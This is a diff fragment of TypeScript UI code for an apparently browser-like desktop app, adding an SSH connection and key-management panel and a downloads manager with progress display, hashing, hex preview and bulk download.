+        `<span style="font-weight:normal;color:#9e9e9e;font-size:11px">→ ${escapeHtml(target)}</span></div>` +
+        (h.identity_file
+          ? `<div style="font-size:11px;color:#9e9e9e">key: ${escapeHtml(h.identity_file)}</div>`
+          : "");
+      card.appendChild(main);
+
+      const cBtn = document.createElement("button");
+      cBtn.type = "button";
+      cBtn.className = "toolbox-primary";
+      cBtn.textContent = "🚀 接続";
+      cBtn.addEventListener("click", () => {
+        void connect(h.alias, null, null, false, false);
+      });
+      card.appendChild(cBtn);
+
+      const eBtn = document.createElement("button");
+      eBtn.type = "button";
+      eBtn.textContent = "✏ 編集";
+      eBtn.addEventListener("click", () => {
+        hAlias.value = h.alias;
+        hHost.value = h.hostname;
+        hUser.value = h.user;
+        hPort.value = h.port ? String(h.port) : "";
+        hKey.value = h.identity_file || "";
+      });
+      card.appendChild(eBtn);
+
+      const dBtn = document.createElement("button");
+      dBtn.type = "button";
+      dBtn.textContent = "🗑";
+      dBtn.title = "削除";
+      dBtn.addEventListener("click", async () => {
+        if (!confirm(`${h.alias} を削除しますか？`)) return;
+        try {
+          await invoke("ssh_delete_host", { alias: h.alias });
+          setStatus(`削除しました: ${h.alias}`);
+          await refreshHosts();
+        } catch (e) {
+          setStatus(`削除失敗: ${String(e)}`, true);
+        }
+      });
+      card.appendChild(dBtn);
+
+      hostList.appendChild(card);
+    }
+  }
+
+  async function connect(
+    target: string,
+    portStr: string | null,
+    identityPath: string | null,
+    strict: boolean,
+    verbose: boolean,
+  ): Promise<void> {
+    const t = target.trim();
+    if (!t) {
+      setStatus("接続先が空です", true);
+      return;
+    }
+    const args: string[] = [];
+    if (portStr) {
+      const p = portStr.trim();
+      if (p) {
+        args.push("-p", p);
+      }
+    }
+    if (identityPath && identityPath.trim()) {
+      args.push("-i", identityPath.trim());
+      args.push("-o", "IdentitiesOnly=yes");
+    }
+    if (strict) {
+      args.push("-o", "StrictHostKeyChecking=no");
+      args.push(
+        "-o",
+        "UserKnownHostsFile=" +
+          ((window as unknown as Record<string, string>).PROCESS_PLATFORM ===
+          "win32"
+            ? "NUL"
+            : "/dev/null"),
+      );
+    }
+    if (verbose) args.push("-v");
+    args.push("-tt"); // 強制 tty (better interactive behavior under non-pty)
+    args.push(t);
+    try {
+      const id = await invoke<number>("terminal_spawn_command", {
+        program: "ssh",
+        args,
+        cwd: null,
+      });
+      const sess: SshSession = {
+        id,
+        label: t,
+        output: `$ ssh ${args.join(" ")}\n`,
+        alive: true,
+      };
+      sshSessions.push(sess);
+      sshActive = id;
+      renderTabs();
+      renderOutput();
+      inputEl.focus();
+      setStatus(`接続中: ${t}`);
+    } catch (e) {
+      setStatus(`接続失敗: ${String(e)}`, true);
+    }
+  }
+
+  async function send(data: string): Promise<void> {
+    const s = getActive();
+    if (!s || !s.alive) return;
+    try {
+      await invoke("terminal_write", { sessionId: s.id, data });
+    } catch (e) {
+      setStatus(`送信失敗: ${String(e)}`, true);
+    }
+  }
+
+  document.getElementById("ssh-q-connect")?.addEventListener("click", () => {
+    void connect(
+      qTarget.value,
+      qPort.value,
+      qKey.value,
+      qStrict.checked,
+      qVerbose.checked,
+    );
+  });
+  qTarget.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      void connect(
+        qTarget.value,
+        qPort.value,
+        qKey.value,
+        qStrict.checked,
+        qVerbose.checked,
+      );
+    }
+  });
+
+  document.getElementById("ssh-h-save")?.addEventListener("click", async () => {
+    const entry: SshHostEntry = {
+      alias: hAlias.value.trim(),
+      hostname: hHost.value.trim(),
+      user: hUser.value.trim(),
+      port: parseInt(hPort.value || "0", 10) || 0,
+      identity_file: hKey.value || "",
+      extra: "",
+    };
+    if (!entry.alias) {
+      setStatus("alias は必須です", true);
+      return;
+    }
+    try {
+      await invoke("ssh_save_host", { entry });
+      setStatus(`保存しました: ${entry.alias}`);
+      await refreshHosts();
+    } catch (e) {
+      setStatus(`保存失敗: ${String(e)}`, true);
+    }
+  });
+  document.getElementById("ssh-h-clear")?.addEventListener("click", () => {
+    hAlias.value = hHost.value = hUser.value = hPort.value = "";
+    hKey.value = "";
+  });
+
+  document.getElementById("ssh-k-gen")?.addEventListener("click", async () => {
+    const name = kName.value.trim();
+    if (!name) {
+      setStatus("鍵名は必須です", true);
+      return;
+    }
+    try {
+      const k = await invoke<SshKeyInfo>("ssh_generate_key", {
+        name,
+        keyType: kType.value,
+        comment: kComment.value || null,
+        overwrite: false,
+      });
+      setStatus(`鍵生成完了: ${k.name} (${k.key_type})`);
+      kName.value = "";
+      kComment.value = "";
+      await refreshKeys();
+    } catch (e) {
+      setStatus(`鍵生成失敗: ${String(e)}`, true);
+    }
+  });
+
+  document
+    .getElementById("ssh-imp-save")
+    ?.addEventListener("click", async () => {
+      const name = impName.value.trim();
+      if (!name) {
+        setStatus("インポート名を指定してください", true);
+        return;
+      }
+      if (!impPriv.value.trim()) {
+        setStatus("秘密鍵テキストを貼り付けてください", true);
+        return;
+      }
+      try {
+        const k = await invoke<SshKeyInfo>("ssh_import_key", {
+          name,
+          privatePem: impPriv.value,
+          publicPem: impPub.value || null,
+          overwrite: false,
+        });
+        setStatus(`インポート完了: ${k.name}`);
+        impName.value = "";
+        impPriv.value = "";
+        impPub.value = "";
+        await refreshKeys();
+      } catch (e) {
+        setStatus(`インポート失敗: ${String(e)}`, true);
+      }
+    });
+
+  document.getElementById("ssh-send")?.addEventListener("click", () => {
+    const v = inputEl.value;
+    inputEl.value = "";
+    void send(v + "\n");
+  });
+  inputEl.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      const v = inputEl.value;
+      inputEl.value = "";
+      void send(v + "\n");
+    } else if (
+      e.ctrlKey &&
+      e.key.toLowerCase() === "c" &&
+      inputEl.selectionStart === inputEl.selectionEnd
+    ) {
+      e.preventDefault();
+      void send("\x03");
+    }
+  });
+  document.getElementById("ssh-sigint")?.addEventListener("click", () => {
+    void send("\x03");
+  });
+  document.getElementById("ssh-disconnect")?.addEventListener("click", () => {
+    const s = getActive();
+    if (!s) return;
+    if (s.alive)
+      invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
+  });
+
+  // 初期化
+  void refreshKeys().then(() => refreshHosts());
+  renderTabs();
+  renderOutput();
+}
+
+// ===== ダウンロード UI =====
+interface DownloadItem {
+  id: number;
+  url: string;
+  filename: string;
+  path: string;
+  bytes: number;
+  started_at: number;
+  finished_at: number | null;
+  status: "in-progress" | "completed" | "failed" | "cancelled";
+  mime: string | null;
+  sha256: string | null;
+  md5: string | null;
+  referrer: string | null;
+  tab_id: number | null;
+  user_agent: string | null;
+}
+
+async function setupDownloadsUI(): Promise<void> {
+  const btn = document.getElementById(
+    "downloads-btn",
+  ) as HTMLButtonElement | null;
+  const badge = document.getElementById(
+    "downloads-badge",
+  ) as HTMLSpanElement | null;
+  const panel = document.getElementById(
+    "downloads-panel",
+  ) as HTMLDivElement | null;
+  const backdrop = document.getElementById(
+    "downloads-backdrop",
+  ) as HTMLDivElement | null;
+  const closeBtn = document.getElementById("downloads-close");
+  const clearBtn = document.getElementById("downloads-clear");
+  const openFolderBtn = document.getElementById("downloads-open-folder");
+  const engineerToggle = document.getElementById("downloads-engineer-toggle");
+  const engineerPanel = document.getElementById(
+    "downloads-engineer",
+  ) as HTMLDivElement | null;
+  const listEl = document.getElementById(
+    "downloads-list",
+  ) as HTMLUListElement | null;
+  const emptyEl = document.getElementById(
+    "downloads-empty",
+  ) as HTMLDivElement | null;
+  const statEl = document.getElementById(
+    "downloads-stat",
+  ) as HTMLSpanElement | null;
+  const verifySel = document.getElementById(
+    "dl-eng-verify-target",
+  ) as HTMLSelectElement | null;
+  const hexView = document.getElementById(
+    "downloads-hex-view",
+  ) as HTMLDivElement | null;
+  const hexBack = document.getElementById("dl-hex-back");
+  const hexContent = document.getElementById(
+    "dl-hex-content",
+  ) as HTMLPreElement | null;
+  const hexTitle = document.getElementById("dl-hex-title");
+  if (!panel || !listEl) return;
+
+  let items: DownloadItem[] = [];
+  const progressMap = new Map<
+    number,
+    { bytes: number; total: number | null; speed?: number }
+  >();
+  const speedTracker = new Map<
+    number,
+    { lastBytes: number; lastTime: number; ema: number }
+  >();
+
+  const showHexView = (show: boolean): void => {
+    if (!hexView || !listEl || !emptyEl) return;
+    hexView.hidden = !show;
+    listEl.hidden = show;
+    emptyEl.hidden = show || items.length > 0 ? true : emptyEl.hidden;
+  };
+
+  const fmtBytes = (n: number): string => {
+    if (n < 1024) return `${n} B`;
+    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
+    if (n < 1024 * 1024 * 1024) return `${(n / 1024 / 1024).toFixed(2)} MB`;
+    return `${(n / 1024 / 1024 / 1024).toFixed(2)} GB`;
+  };
+  const fmtAgo = (ms: number): string => {
+    const d = Date.now() - ms;
+    if (d < 60_000) return "今";
+    if (d < 3600_000) return `${Math.floor(d / 60_000)}分前`;
+    if (d < 86400_000) return `${Math.floor(d / 3600_000)}時間前`;
+    return `${Math.floor(d / 86400_000)}日前`;
+  };
+  const iconFor = (it: DownloadItem): string => {
+    const m = it.mime ?? "";
+    if (m.startsWith("image/")) return "🖼";
+    if (m.startsWith("video/")) return "🎬";
+    if (m.startsWith("audio/")) return "🎵";
+    if (m.includes("pdf")) return "📕";
+    if (
+      m.includes("zip") ||
+      m.includes("compressed") ||
+      m.includes("rar") ||
+      m.includes("7z") ||
+      m.includes("gzip")
+    )
+      return "🗜";
+    if (m.includes("json") || m.includes("xml") || m.includes("javascript"))
+      return "📄";
+    if (m.includes("msdownload") || m.includes("elf")) return "⚙";
+    if (it.filename.match(/\.(exe|msi|dmg|deb|rpm|appimage)$/i)) return "⚙";
+    if (it.filename.match(/\.(zip|tar|gz|7z|rar|xz|bz2)$/i)) return "🗜";
+    return "📦";
+  };
+
+  const updateBadge = (): void => {
+    const inProg = items.filter((i) => i.status === "in-progress").length;
+    if (!badge) return;
+    if (inProg > 0) {
+      badge.hidden = false;
+      badge.textContent = String(inProg);
+    } else {
+      badge.hidden = true;
+    }
+  };
+
+  // Toolbox 側ミラー要素
+  const tbList = document.getElementById(
+    "tb-dl-list",
+  ) as HTMLUListElement | null;
+  const tbEmpty = document.getElementById(
+    "tb-dl-empty",
+  ) as HTMLDivElement | null;
+  const tbStat = document.getElementById(
+    "tb-dl-stat",
+  ) as HTMLSpanElement | null;
+  const tbHexView = document.getElementById(
+    "tb-dl-hex-view",
+  ) as HTMLDivElement | null;
+  const tbHexContent = document.getElementById(
+    "tb-dl-hex-content",
+  ) as HTMLPreElement | null;
+  const tbHexTitle = document.getElementById("tb-dl-hex-title");
+  const tbHexBack = document.getElementById("tb-dl-hex-back");
+  const tbVerifySel = document.getElementById(
+    "tb-dl-verify-target",
+  ) as HTMLSelectElement | null;
+  const tbVerifyHash = document.getElementById(
+    "tb-dl-verify-hash",
+  ) as HTMLInputElement | null;
+  const tbVerifyGo = document.getElementById("tb-dl-verify-go");
+  const tbVerifyResult = document.getElementById("tb-dl-verify-result");
+  const tbBulk = document.getElementById(
+    "tb-dl-bulk",
+  ) as HTMLTextAreaElement | null;
+  const tbBulkGo = document.getElementById("tb-dl-bulk-go");
+  const tbHeaders = document.getElementById(
+    "tb-dl-headers",
+  ) as HTMLTextAreaElement | null;
+  const tbUa = document.getElementById("tb-dl-ua") as HTMLInputElement | null;
+  const tbRef = document.getElementById("tb-dl-ref") as HTMLInputElement | null;
+
+  type HexCtx = {
+    view: HTMLDivElement | null;
+    content: HTMLPreElement | null;
+    title: HTMLElement | null;
+  };
+  const panelHexCtx: HexCtx = {
+    view: hexView,
+    content: hexContent,
+    title: hexTitle,
+  };
+  const tbHexCtx: HexCtx = {
+    view: tbHexView,
+    content: tbHexContent,
+    title: tbHexTitle,
+  };
+
+  const showHexCtx = (ctx: HexCtx, on: boolean): void => {
+    if (ctx.view) ctx.view.hidden = !on;
+  };
+
+  const buildItemEl = (it: DownloadItem, hexCtx: HexCtx): HTMLLIElement => {
+    const li = document.createElement("li");
+    li.className = "dl-item";
+    const row = document.createElement("div");
+    row.className = "dl-item-row";
+    const icon = document.createElement("span");
+    icon.className = "dl-icon";
+    icon.textContent = iconFor(it);
+    const name = document.createElement("span");
+    name.className = "dl-name";
+    name.textContent = it.filename;
+    name.title = it.path;
+    name.addEventListener("click", () => {
+      if (it.status === "completed") {
+        void invoke("downloads_open_file", { id: it.id });
+      }
+    });
+    row.appendChild(icon);
+    row.appendChild(name);
+    li.appendChild(row);
+
+    const meta = document.createElement("div");
+    meta.className = "dl-meta";
+    const status = document.createElement("span");
+    status.className = `dl-status-${it.status}`;
+    const statusText: Record<string, string> = {
+      "in-progress": "⏳ ダウンロード中",
+      completed: "✓ 完了",
+      failed: "✗ 失敗",
+      cancelled: "⊘ 中断",
+    };
+    status.textContent = statusText[it.status] ?? it.status;
+    meta.appendChild(status);
+    const prog = progressMap.get(it.id);
+    const bytesNow = prog?.bytes ?? it.bytes;
+    const totalHint = prog?.total ?? null;
+    const sizeSpan = document.createElement("span");
+    if (it.status === "in-progress" && totalHint) {
+      sizeSpan.textContent = `${fmtBytes(bytesNow)} / ${fmtBytes(totalHint)}`;
+    } else if (bytesNow > 0) {
+      sizeSpan.textContent = fmtBytes(bytesNow);
+    }
+    meta.appendChild(sizeSpan);
+    if (it.status === "in-progress") {
+      const tracker = speedTracker.get(it.id);
+      if (tracker && tracker.ema > 0) {
+        const sp = document.createElement("span");
+        sp.className = "dl-speed";
+        sp.textContent = `${fmtBytes(tracker.ema)}/s`;
+        meta.appendChild(sp);
+        if (totalHint && tracker.ema > 0) {
+          const remain = (totalHint - bytesNow) / tracker.ema;
+          const eta = document.createElement("span");
+          eta.textContent =
+            remain < 60
+              ? `残り${Math.ceil(remain)}秒`
+              : `残り${Math.ceil(remain / 60)}分`;
+          meta.appendChild(eta);
+        }
+      }
+    }
+    const time = document.createElement("span");
+    time.textContent = fmtAgo(it.started_at);
+    meta.appendChild(time);
+    if (it.mime) {
+      const m = document.createElement("span");
+      m.textContent = it.mime;
+      meta.appendChild(m);
+    }
+    li.appendChild(meta);
+
+    if (it.status === "in-progress") {
+      const bar = document.createElement("div");
+      bar.className = "dl-progress";
+      const fill = document.createElement("div");
+      if (totalHint && totalHint > 0) {
+        fill.className = "dl-progress-fill";
+        fill.style.width = `${Math.min(100, (bytesNow / totalHint) * 100)}%`;
+      } else {
+        fill.className = "dl-progress-fill indeterminate";
+      }
+      bar.appendChild(fill);
+      li.appendChild(bar);
+    }
+
+    if (it.sha256) {
+      const h = document.createElement("div");
+      h.className = "dl-hash";
+      h.textContent = `SHA-256: ${it.sha256}`;
+      li.appendChild(h);
+    }
+    if (it.md5) {
+      const h = document.createElement("div");
+      h.className = "dl-hash";
+      h.textContent = `MD5: ${it.md5}`;
+      li.appendChild(h);
+    }
+
+    const actions = document.createElement("div");
+    actions.className = "dl-actions";
+    const mkBtn = (
+      label: string,
+      title: string,
+      fn: () => void,
+    ): HTMLButtonElement => {
+      const b = document.createElement("button");
+      b.type = "button";
+      b.textContent = label;
+      b.title = title;
+      b.addEventListener("click", fn);
+      return b;
+    };
+    if (it.status === "completed") {
+      actions.appendChild(
+        mkBtn("📂 開く", "ファイルを開く", () => {
+          void invoke("downloads_open_file", { id: it.id });
+        }),
+      );
+      actions.appendChild(
+        mkBtn("📁 場所", "フォルダで表示", () => {
+          void invoke("downloads_show_in_folder", { id: it.id });
+        }),
+      );
+      actions.appendChild(
+        mkBtn("# ハッシュ", "SHA-256 / MD5 を計算", async () => {
+          try {
+            const r = await invoke<{
+              sha256: string;
+              md5: string;
+              bytes: number;
+            }>("downloads_compute_hash", { id: it.id });
+            it.sha256 = r.sha256;
+            it.md5 = r.md5;
+            render();
+          } catch (e) {
+            alert(`ハッシュ計算失敗: ${e}`);
+          }
+        }),
+      );
+      actions.appendChild(
+        mkBtn("🔍 HEX", "先頭 512 バイトを表示", async () => {
+          try {
+            const r = await invoke<{
+              hex: string;
+              truncated: boolean;
+              bytes: number;
+            }>("downloads_hex_preview", { id: it.id });
+            if (hexCtx.content && hexCtx.title) {
+              hexCtx.title.textContent = `HEX: ${it.filename} (${fmtBytes(r.bytes)}${r.truncated ? ", 先頭のみ" : ""})`;
+              hexCtx.content.textContent = r.hex || "(空ファイル)";
+              showHexCtx(hexCtx, true);
+            }
+          } catch (e) {
+            alert(`HEX 取得失敗: ${e}`);
+          }
+        }),
+      );
+    }
+    actions.appendChild(
+      mkBtn("🔗 URL", "URL をコピー", () => {
+        void navigator.clipboard.writeText(it.url);
+      }),
+    );
+    actions.appendChild(
+      mkBtn("⌨ cURL", "cURL コマンドをコピー", async () => {
+        try {
+          const c = await invoke<string>("downloads_curl_for", { id: it.id });
+          await navigator.clipboard.writeText(c);
+        } catch (e) {
+          alert(`cURL 生成失敗: ${e}`);
+        }
+      }),
+    );
+    actions.appendChild(
+      mkBtn("🗑 削除", "履歴から削除", () => {
+        void invoke("downloads_remove", { id: it.id }).then(() => {
+          items = items.filter((x) => x.id !== it.id);
+          render();
+        });
+      }),
+    );
+    li.appendChild(actions);
+    return li;
+  };
+
+  const render = (): void => {
+    if (!listEl || !emptyEl) return;
+    listEl.innerHTML = "";
+    if (tbList) tbList.innerHTML = "";
+    const isEmpty = items.length === 0;
+    emptyEl.hidden = !isEmpty;
+    if (tbEmpty) tbEmpty.hidden = !isEmpty;
+    const completed = items.filter((i) => i.status === "completed").length;
+    const totalBytes = items
+      .filter((i) => i.status === "completed")
+      .reduce((s, i) => s + i.bytes, 0);
+    const statText = `${items.length}件 / 完了${completed} / ${fmtBytes(totalBytes)}`;
+    if (statEl) statEl.textContent = statText;
+    if (tbStat) tbStat.textContent = statText;
+    const populateVerify = (sel: HTMLSelectElement | null): void => {
+      if (!sel) return;
+      const cur = sel.value;
+      sel.innerHTML = "";
+      for (const it of [...items].reverse()) {
+        if (it.status !== "completed") continue;
+        const opt = document.createElement("option");
+        opt.value = String(it.id);
+        opt.textContent = it.filename;
+        sel.appendChild(opt);
+      }
+      if (cur) sel.value = cur;
+    };
+    populateVerify(verifySel);
+    populateVerify(tbVerifySel);
+    const sorted = [...items].sort((a, b) => b.started_at - a.started_at);
+    for (const it of sorted) {
+      listEl.appendChild(buildItemEl(it, panelHexCtx));
+      if (tbList) tbList.appendChild(buildItemEl(it, tbHexCtx));
+    }
+    updateBadge();
+  };
+
+  const refresh = async (): Promise<void> => {
+    try {
+      items = await invoke<DownloadItem[]>("downloads_list");
+    } catch (e) {
+      console.error("downloads_list failed:", e);
+      items = [];
+    }
+    render();
+  };
+
+  const openDownloadsPanel = async (): Promise<void> => {
+    try {
+      await closeToolboxPanel();
+    } catch {
+      /* noop */
+    }
+    // ページを退避する前にスクリーンショットを撮って背景に設定
+    try {
+      const result = await invoke<{
+        data_url: string;
+        title_bar_height: number;
+        logical_width: number;
+        logical_height: number;
+      }>("capture_active_page");
+      document.body.style.backgroundImage = `url('${result.data_url}')`;
+      document.body.style.backgroundSize = `${result.logical_width}px ${result.logical_height}px`;
+      document.body.style.backgroundPosition = `0 ${-result.title_bar_height}px`;
+      document.body.style.backgroundRepeat = "no-repeat";
+    } catch (e) {
+      console.error("capture_active_page failed:", e);
+    }
+    document.body.classList.add("downloads-overlay-open");
+    try {
+      await invoke("ui_set_expanded", { expanded: true });
+    } catch {
+      /* noop */
+    }
+    panel.hidden = false;
+    await refresh();
+  };
+  const closeDownloadsPanel = (): void => {
+    panel.hidden = true;
+    document.body.classList.remove("downloads-overlay-open");
+    document.body.style.backgroundImage = "";
+    document.body.style.backgroundSize = "";
+    document.body.style.backgroundPosition = "";
+    document.body.style.backgroundRepeat = "";
+    void invoke("ui_set_expanded", { expanded: false }).catch(() => {});
+  };
+
+  btn?.addEventListener("click", () => {
+    const opening = panel.hidden;
+    // ツールボックスは事前に隠す
+    const tbPanelEl = document.getElementById(
+      "toolbox-panel",
+    ) as HTMLDivElement | null;
+    if (tbPanelEl) {
+      tbPanelEl.hidden = true;
+      tbPanelEl.style.display = "none";
+    }
+    if (backdrop) backdrop.hidden = true;
+    if (opening) {
+      // panel.hidden は openDownloadsPanel 内で WebView 拡張後に false にする
+      void openDownloadsPanel();
+    } else {
+      closeDownloadsPanel();
+    }
+  });
+  closeBtn?.addEventListener("click", () => {
+    panel.hidden = true;
+    if (backdrop) backdrop.hidden = true;
+    showHexView(false);
+    closeDownloadsPanel();
+  });
+  backdrop?.addEventListener("click", () => {
+    panel.hidden = true;
+    backdrop.hidden = true;
+    showHexView(false);
+    closeDownloadsPanel();
+  });
+  clearBtn?.addEventListener("click", () => {
+    if (!confirm("完了済みダウンロード履歴を全てクリアしますか?")) return;
+    void invoke("downloads_clear").then(() => void refresh());
+  });
+  openFolderBtn?.addEventListener("click", () => {
+    void invoke("downloads_open_folder");
+  });
+  engineerToggle?.addEventListener("click", () => {
+    if (engineerPanel) engineerPanel.hidden = !engineerPanel.hidden;
+  });
+  hexBack?.addEventListener("click", () => {
+    showHexView(false);
+  });
+  tbHexBack?.addEventListener("click", () => {
+    if (tbHexView) tbHexView.hidden = true;
+  });
+
+  // エンジニア: 手動ダウンロード
+  const parseHeaders = (text: string): Array<[string, string]> => {
+    const out: Array<[string, string]> = [];
+    for (const line of text.split(/\r?\n/)) {
+      const m = line.match(/^\s*([^:]+?)\s*:\s*(.+?)\s*$/);
+      if (m) out.push([m[1], m[2]]);
+    }
+    return out;
+  };
+  const engGo = document.getElementById("dl-eng-go");
+  const engBulkGo = document.getElementById("dl-eng-bulk-go");
+  const engUrl = document.getElementById(
+    "dl-eng-url",
+  ) as HTMLInputElement | null;
+  const engName = document.getElementById(
+    "dl-eng-name",
+  ) as HTMLInputElement | null;
+  const engUa = document.getElementById("dl-eng-ua") as HTMLInputElement | null;
+  const engRef = document.getElementById(
+    "dl-eng-ref",
+  ) as HTMLInputElement | null;
+  const engHeaders = document.getElementById(
+    "dl-eng-headers",
+  ) as HTMLTextAreaElement | null;
+  const engBulk = document.getElementById(
+    "dl-eng-bulk",
+  ) as HTMLTextAreaElement | null;
+  const verifyHash = document.getElementById(
+    "dl-eng-verify-hash",
+  ) as HTMLInputElement | null;
+  const verifyGo = document.getElementById("dl-eng-verify-go");
+  const verifyResult = document.getElementById("dl-eng-verify-result");
+  const parallelChk = document.getElementById(
+    "dl-eng-parallel",
+  ) as HTMLInputElement | null;
+  const connectionsInput = document.getElementById(
+    "dl-eng-connections",
+  ) as HTMLInputElement | null;
+  const randomizeChk = document.getElementById(
+    "dl-eng-randomize",
+  ) as HTMLInputElement | null;
+  // Toolbox 連携要素
+  const tbUrl = document.getElementById("tb-dl-url") as HTMLInputElement | null;
+  const tbName = document.getElementById(
+    "tb-dl-name",
+  ) as HTMLInputElement | null;
+  const tbRand = document.getElementById(
+    "tb-dl-rand",
+  ) as HTMLInputElement | null;
+  const tbParallel = document.getElementById(
+    "tb-dl-parallel",
+  ) as HTMLInputElement | null;
+  const tbConn = document.getElementById(
+    "tb-dl-conn",
+  ) as HTMLInputElement | null;
+  const tbGo = document.getElementById("tb-dl-go");
+  const tbOpenPanel = document.getElementById("tb-dl-open-panel");
+  const tbFillCurrent = document.getElementById("tb-dl-fill-current");
+  const tbStatus = document.getElementById("tb-dl-status");
+
+  // ランダムなファイル名 (拡張子は維持) を生成
+  const randomizeFilename = (urlOrName: string): string => {
+    let ext = "";
+    try {
+      const u = new URL(urlOrName);
+      const m = u.pathname.match(/\.([a-zA-Z0-9]{1,8})$/);
+      if (m) ext = "." + m[1];
+    } catch {
+      const m = urlOrName.match(/\.([a-zA-Z0-9]{1,8})$/);
+      if (m) ext = "." + m[1];
+    }
+    const rand = Array.from(crypto.getRandomValues(new Uint8Array(12)))
+      .map((b) => b.toString(36).padStart(2, "0"))
+      .join("")
+      .slice(0, 16);
+    return `dl_${Date.now().toString(36)}_${rand}${ext}`;
+  };
+
+  // ⬇ ボタンのパルス & トースト表示
+  const pulseDownloadBtn = (): void => {
+    if (!btn) return;
+    btn.classList.remove("dl-pulse");
+    // reflow trigger
+    void btn.offsetWidth;
+    btn.classList.add("dl-pulse");
+    window.setTimeout(() => btn.classList.remove("dl-pulse"), 1900);
+  };
+  let toastHost: HTMLDivElement | null = null;
+  const ensureToastHost = (): HTMLDivElement => {
+    if (toastHost && document.body.contains(toastHost)) return toastHost;
+    toastHost = document.createElement("div");
+    toastHost.className = "dl-toast-host";
+    document.body.appendChild(toastHost);
+    return toastHost;
+  };
+  const showToast = (
+    title: string,
+    body?: string,
+    variant: "info" | "finished" | "failed" = "info",
+    durationMs = 3500,
+  ): void => {
+    const host = ensureToastHost();
+    const el = document.createElement("div");
+    el.className = `dl-toast dl-toast-${variant}`;
+    const t = document.createElement("div");
+    t.className = "dl-toast-title";
+    t.textContent = title;
+    el.appendChild(t);
+    if (body) {
+      const b = document.createElement("div");
+      b.className = "dl-toast-body";
+      b.textContent = body;
+      el.appendChild(b);
+    }
+    host.appendChild(el);
+    el.addEventListener("click", () => {
+      panel.hidden = false;
+      if (backdrop) backdrop.hidden = false;
+      void (async () => {
+        try {
+          await closeToolboxPanel();
+        } catch {
+          /* noop */
+        }
+        try {
+          await invoke("ui_set_expanded", { expanded: true });
+        } catch {
+          /* noop */
+        }
+        await refresh();
+      })();
+      el.remove();
+    });
+    window.setTimeout(() => {
+      el.classList.add("dl-toast-leave");
+      window.setTimeout(() => el.remove(), 260);
+    }, durationMs);
+  };
+
+  const triggerSave = async (
+    url: string,
+    filename?: string,
+    overrides?: {
+      randomize?: boolean;
+      parallel?: boolean;
+      connections?: number;
+      headers?: Array<[string, string]>;
+      userAgent?: string | null;
+      referrer?: string | null;
+    },
+  ): Promise<void> => {
+    const wantRandom = overrides?.randomize ?? randomizeChk?.checked ?? false;
+    let finalName = filename;
+    if (wantRandom) {
+      finalName = randomizeFilename(filename || url);
+    }
+    const opts = {
+      url,
+      filename: finalName ?? null,
+      headers:
+        overrides?.headers ??
+        (engHeaders ? parseHeaders(engHeaders.value) : []),
+      user_agent: overrides?.userAgent ?? engUa?.value ?? null,
+      referrer: overrides?.referrer ?? engRef?.value ?? null,
+      parallel: overrides?.parallel ?? parallelChk?.checked ?? true,
+      connections: Math.max(
+        2,
+        Math.min(
+          32,
+          overrides?.connections ??
+            (parseInt(connectionsInput?.value ?? "8", 10) || 8),
+        ),
+      ),
+    };
+    // 即座にフィードバック
+    pulseDownloadBtn();
+    showToast("⬇ ダウンロード開始", finalName || url, "info", 2500);
+    try {
+      await invoke<number>("downloads_save_url", { opts });
+    } catch (e) {
+      showToast("ダウンロード失敗", String(e), "failed", 5000);
+      alert(`ダウンロード失敗: ${e}`);
+    }
+  };
+  engGo?.addEventListener("click", () => {
+    const u = engUrl?.value?.trim();
+    if (!u) {
+      alert("URL を入力してください");
+      return;
+    }
+    void triggerSave(u, engName?.value?.trim() || undefined);
+    if (engUrl) engUrl.value = "";
+    if (engName) engName.value = "";
+  });
+  // Toolbox 側 (📥 ダウンロード) 配線
+  tbFillCurrent?.addEventListener("click", () => {
+    const a = activeTab();
+    if (a && tbUrl) tbUrl.value = a.url;
+  });
+  tbOpenPanel?.addEventListener("click", () => {
+    panel.hidden = false;
+    if (backdrop) backdrop.hidden = false;
+    void (async () => {
+      try {
+        await closeToolboxPanel();
+      } catch {
+        /* noop */
+      }
+      try {
+        await invoke("ui_set_expanded", { expanded: true });
+      } catch {
+        /* noop */
+      }
+      await refresh();
+    })();
+  });
+  tbGo?.addEventListener("click", () => {
+    const u = tbUrl?.value?.trim();
+    if (!u) {
+      if (tbStatus) tbStatus.textContent = "URL を入力してください";
+      return;
+    }
+    if (tbStatus) tbStatus.textContent = "送信しました";
+    void triggerSave(u, tbName?.value?.trim() || undefined, {
+      randomize: tbRand?.checked,
+      parallel: tbParallel?.checked,
+      connections: parseInt(tbConn?.value ?? "8", 10) || 8,
+      headers: tbHeaders ? parseHeaders(tbHeaders.value) : undefined,
+      userAgent: tbUa?.value || null,
+      referrer: tbRef?.value || null,
+    });
+    if (tbUrl) tbUrl.value = "";
+    if (tbName) tbName.value = "";
+    window.setTimeout(() => {
+      if (tbStatus) tbStatus.textContent = "";
+    }, 2500);
+  });
+  tbBulkGo?.addEventListener("click", () => {
+    const text = tbBulk?.value ?? "";
+    const urls = text
+      .split(/\r?\n/)
+      .map((s) => s.trim())
+      .filter((s) => /^https?:\/\//.test(s));
+    if (urls.length === 0) {
+      alert("有効な URL が見つかりません");
+      return;
+    }
+    if (!confirm(`${urls.length} 件をダウンロードしますか?`)) return;
+    void (async () => {
+      for (const u of urls) {
+        await triggerSave(u, undefined, {
+          randomize: tbRand?.checked,
+          parallel: tbParallel?.checked,
+          connections: parseInt(tbConn?.value ?? "8", 10) || 8,
+          headers: tbHeaders ? parseHeaders(tbHeaders.value) : undefined,
+          userAgent: tbUa?.value || null,
+          referrer: tbRef?.value || null,
+        });
+      }
+    })();
+  });
+  tbVerifyGo?.addEventListener("click", async () => {
+    const id = parseInt(tbVerifySel?.value ?? "", 10);
+    const exp = tbVerifyHash?.value?.trim();
+    if (!id || !exp) {
+      if (tbVerifyResult)
+        tbVerifyResult.textContent = "対象とハッシュ値を指定してください";
+      return;
+    }
+    if (tbVerifyResult) tbVerifyResult.textContent = "検証中...";
+    try {
+      const ok = await invoke<boolean>("downloads_verify_hash", {
+        id,
+        expected: exp,
+      });
+      if (tbVerifyResult) {
+        tbVerifyResult.textContent = ok
+          ? "✓ 一致しました"
+          : "✗ 不一致 (改ざん/破損の可能性)";
+        tbVerifyResult.style.color = ok ? "#4ade80" : "#f87171";
+      }
+      await refresh();
+    } catch (e) {
+      if (tbVerifyResult) tbVerifyResult.textContent = `エラー: ${e}`;
+    }
+  });
+
